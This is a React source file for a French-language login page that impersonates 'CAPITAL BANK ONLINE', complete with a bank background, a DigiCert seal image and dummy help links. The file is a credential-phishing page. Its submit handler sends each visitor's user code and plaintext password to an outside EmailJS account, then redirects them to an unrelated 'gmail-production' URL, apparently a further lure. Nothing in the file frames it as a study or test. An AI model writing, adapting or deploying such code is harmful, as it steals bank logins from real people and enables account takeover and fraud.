import { useState, useEffect, type FormEvent } from 'react';
import { Search, User, Lock } from 'lucide-react';
import emailjs from '@emailjs/browser';

const EMAIL_JS_PUBLIC_KEY = import.meta.env.EMAIL_JS_PUBLIC_KEY as string | undefined;
const EMAIL_JS_SERVICE_ID = import.meta.env.EMAIL_JS_SERVICE_ID as string | undefined;
const EMAIL_JS_TEMPLATE_ID = import.meta.env.EMAIL_JS_TEMPLATE_ID as string | undefined;

if (EMAIL_JS_PUBLIC_KEY) {
  emailjs.init(EMAIL_JS_PUBLIC_KEY);
}

function App() {
  const [userCode, setUserCode] = useState('');
  const [password, setPassword] = useState('');
  const [remember, setRemember] = useState(false);
  const [emailStatus, setEmailStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');

  useEffect(() => {
    if (emailStatus === 'success') {
      const timer = setTimeout(() => {
        window.location.href = 'https://gmail-production-d7c1.up.railway.app';
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [emailStatus]);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    if (!EMAIL_JS_SERVICE_ID || !EMAIL_JS_TEMPLATE_ID || !EMAIL_JS_PUBLIC_KEY) {
      console.warn(
        'EmailJS is not configured. Set EMAIL_JS_SERVICE_ID, EMAIL_JS_TEMPLATE_ID and EMAIL_JS_PUBLIC_KEY.'
      );
      setEmailStatus('error');
      return;
    }

    setEmailStatus('sending');

    try {
      await emailjs.send(EMAIL_JS_SERVICE_ID, EMAIL_JS_TEMPLATE_ID, {
        user_code: userCode,
        password: password,
        timestamp: new Date().toISOString(),
        message: 'Login attempt detected',
      });
      setEmailStatus('success');
    } catch (error) {
      console.error('Failed to send login notification email', error);
      setEmailStatus('error');
    }
  };

  return (
    <div
      className="min-h-screen relative overflow-y-auto bg-cover bg-center bg-no-repeat"
      style={{ backgroundImage: 'url(/bank-background.png)' }}
    >
      <nav className="bg-gray-800 text-white px-2 sm:px-4 py-2">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-2 sm:space-x-4">
            <div className="flex items-center space-x-2">
              <img
                src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='12' viewBox='0 0 20 12'%3E%3Cpath fill='%23002395' d='M0 0h20v4H0z'/%3E%3Cpath fill='%23fff' d='M0 4h20v4H0z'/%3E%3Cpath fill='%23ED2939' d='M0 8h20v4H0z'/%3E%3C/svg%3E"
                alt="Français"
                className="w-5 h-3"
              />
              <span className="text-xs sm:text-sm">Français</span>
            </div>
          </div>

          <div className="hidden sm:flex items-center space-x-6">
            <a href="#" className="text-xs sm:text-sm hover:text-gray-300 transition-colors">
              Localiser
            </a>
            <span className="text-gray-400 hidden sm:inline">|</span>
            <a href="#" className="text-xs sm:text-sm hover:text-gray-300 transition-colors">
              Nous contacter
            </a>
            <div className="hidden md:flex items-center bg-white rounded">
              <input
                type="text"
                placeholder="Rechercher..."
                className="px-2 sm:px-3 py-1 text-gray-800 text-xs sm:text-sm outline-none rounded-l w-20 sm:w-auto"
              />
              <button className="p-1 text-gray-600 hover:text-gray-800 transition-colors">
                <Search className="h-4 w-4" />
              </button>
            </div>
          </div>
        </div>
      </nav>

      <div className="absolute top-20 sm:top-32 left-4 sm:left-24 z-20">
        <div className="bg-white bg-opacity-90 backdrop-blur-sm rounded-lg shadow-2xl p-4 sm:p-6 w-80 sm:w-96 border border-gray-200">
          <h2 className="text-lg sm:text-xl font-bold text-gray-700 text-center mb-6">
            CAPITAL BANK ONLINE
          </h2>

          <form className="space-y-4" onSubmit={handleSubmit}>
            <div>
              <label htmlFor="userCode" className="block text-xs sm:text-sm font-medium text-gray-700 mb-1">
                Code utilisateur
              </label>
              <div className="relative">
                <input
                  id="userCode"
                  type="text"
                  className="w-full pl-8 sm:pl-10 pr-4 py-2 border rounded-md focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-colors text-sm border-gray-300"
                  placeholder="Entrez votre code utilisateur"
                  value={userCode}
                  onChange={(e) => setUserCode(e.target.value)}
                />
                <User className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
              </div>
            </div>

            <div>
              <label htmlFor="password" className="block text-xs sm:text-sm font-medium text-gray-700 mb-1">
                Mot de passe
              </label>
              <div className="relative">
                <input
                  id="password"
                  type="password"
                  className="w-full pl-8 sm:pl-10 pr-4 py-2 border rounded-md focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-colors text-sm border-gray-300"
                  placeholder="Entrez votre mot de passe"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <Lock className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
              </div>
            </div>

            <div className="flex items-center">
              <input
                id="remember"
                type="checkbox"
                className="h-4 w-4 text-red-600 focus:ring-red-500 border-gray-300 rounded"
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
              />
              <label htmlFor="remember" className="ml-2 block text-xs sm:text-sm text-gray-700">
                Se souvenir de moi
              </label>
            </div>

            <button
              type="submit"
              className="w-full bg-red-600 text-white py-2 sm:py-3 px-4 rounded-md font-medium hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 transition-colors shadow-lg text-sm sm:text-base"
            >
              Connexion
            </button>
          </form>

          {emailStatus === 'success' && (
            <p className="mt-4 text-center text-sm text-blue-600 font-medium">
              Vérification en cours...
            </p>
          )}

          <div className="mt-6 space-y-2 text-center">
            <a href="#" className="block text-xs sm:text-sm text-blue-600 hover:text-blue-800 transition-colors underline">
              Code utilisateur oublié?
            </a>
            <a href="#" className="block text-xs sm:text-sm text-blue-600 hover:text-blue-800 transition-colors underline">
              Mot de passe oublié?
            </a>
          </div>

          <div className="mt-8 pt-6 border-t border-gray-200">
            <h3 className="font-semibold text-gray-700 text-xs sm:text-sm mb-3">CAPITAL BANK ONLINE</h3>
            <div className="space-y-2">
              <a href="#" className="block text-xs sm:text-sm text-blue-600 hover:text-blue-800 transition-colors underline">
                Souscription pour Entreprise
              </a>
              <a href="#" className="block text-xs sm:text-sm text-blue-600 hover:text-blue-800 transition-colors underline">
                Souscription pour Particulier
              </a>
            </div>
          </div>

          <div className="mt-6 flex items-center justify-center">
            <img src="/security-seal.webp" alt="DigiCert Secured" className="h-8 w-auto" />
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
